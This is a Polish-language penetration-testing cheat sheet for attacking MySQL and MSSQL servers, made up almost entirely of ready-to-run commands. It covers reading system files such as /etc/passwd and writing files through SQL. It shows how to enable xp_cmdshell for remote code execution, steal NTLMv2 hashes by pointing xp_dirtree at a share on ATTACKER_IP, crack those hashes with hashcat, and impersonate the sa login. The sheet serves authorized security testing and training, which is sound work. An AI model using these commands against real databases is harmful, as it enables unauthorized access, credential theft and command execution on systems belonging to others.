**Nmap**
nmap -sC -sV -p3306 IP


**Połączenie**
mysql -u user -p'PASSWORD' -h IP


**Enumeracja**
SHOW DATABASES;
USE database;
SHOW TABLES;
SELECT * FROM users;


**Odczyt plików
**SELECT LOAD_FILE('/etc/passwd');


**Zapis plików
**SELECT 'test' INTO OUTFILE '/tmp/test.txt';



**MSSQL**
Nmap
nmap -sC -sV -p1433,1434,2433 IP


**Połączenie**
mssqlclient.py user@IP
sqsh -S IP -U user -P 'PASSWORD' -h
sqlcmd -S IP -U user -P 'PASSWORD'


**Uwierzytelnianie Windows
mssqlclient.py DOMAIN/user:PASSWORD@IP


**Enumeracja**
SELECT name FROM master.dbo.sysdatabases;
USE database;
SELECT table_name FROM database.INFORMATION_SCHEMA.TABLES;
SELECT * FROM users;


xp_cmdshell (RCE)
EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
GO

EXEC xp_cmdshell 'whoami';
GO


**Odczyt plików
SELECT * FROM OPENROWSET(
BULK 'C:/Windows/System32/drivers/etc/hosts',
SINGLE_CLOB
) AS Contents;
GO


**Hash Stealing (NTLMv2)
EXEC master..xp_dirtree '\\ATTACKER_IP\share\test';
GO


hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt


**Impersonation**
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
REVERT;


**Linked Servers
SELECT srvname, isremote FROM sysservers;
SELECT name, product, provider, data_source FROM sys.servers;
